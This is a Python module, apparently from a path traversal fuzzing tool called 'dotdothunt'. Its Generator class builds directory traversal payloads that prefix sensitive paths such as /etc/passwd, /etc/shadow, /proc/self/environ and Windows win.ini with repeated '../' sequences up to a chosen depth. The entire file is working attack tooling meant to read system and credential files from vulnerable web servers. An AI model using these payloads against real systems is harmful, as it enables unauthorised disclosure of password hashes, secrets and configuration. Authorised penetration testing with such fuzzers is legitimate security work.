# dotdothunt/generators/words_generator.py
class Generator:
    def __init__(self, protocol, inputs, depth, os_type, custom_file=None):
        self.protocol = protocol
        self.inputs = inputs
        self.depth = depth
        self.os_type = os_type
        self.custom_file = custom_file

    def get_payloads(self):
        payloads = []
        url = self.inputs['url'][0]
        fuzz_count = url.count('FUZZ')

        if self.custom_file:
            base_files = [self.custom_file]
        else:
            linux_files = ['/etc/passwd', '/etc/shadow', '/proc/self/environ']
            windows_files = ['/windows/win.ini', '/windows/system.ini']
            if self.os_type == 'windows':
                base_files = windows_files
            elif self.os_type == 'linux':
                base_files = linux_files
            else:
                base_files = linux_files + windows_files

        single_payloads = []
        for file_path in base_files:
            for i in range(self.depth + 1):
                traversal = "../" * i
                single_payloads.append(f"{traversal}{file_path.lstrip('/')}")
        
        if fuzz_count == 1:
            return single_payloads
        else:
            return single_payloads
